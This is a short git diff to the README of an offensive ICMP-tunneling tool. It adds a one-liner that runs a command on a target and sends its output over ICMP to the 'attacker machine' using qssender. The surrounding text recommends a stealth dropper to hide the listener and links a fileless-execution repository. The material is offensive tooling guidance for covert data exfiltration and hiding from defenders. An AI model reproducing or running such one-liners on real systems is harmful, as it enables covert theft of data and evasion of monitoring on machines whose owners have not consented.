@@ -32,6 +32,13 @@ On both machines you need to have `qssender`and `qsreceiver`
 
 *Product placement: To be stealthly, you `listener` should use a dropper and hide its presence. You could find a stealth dropper example in [fileless-xec](https://github.com/ariary/fileless-xec) repo. Should I adapt it to use ICMP ? 🤔*
 
+### One-liner to redirect command output
+
+Useful if you can't spawn a shell and thus don't have output for command. You could redirect the output to your attacker machine:
+```
+export CMD=$([cmd]);qssender send "$CMD" -d 1 -l $LISTEN -r $REMOTE -s 100 -N
+```
+
 ## HTTP over ICMP tunneling
 
 For a much more sophisticated ICMP tunneling solution see [icmptunnel](https://github.com/DhavalKapil/icmptunnel)
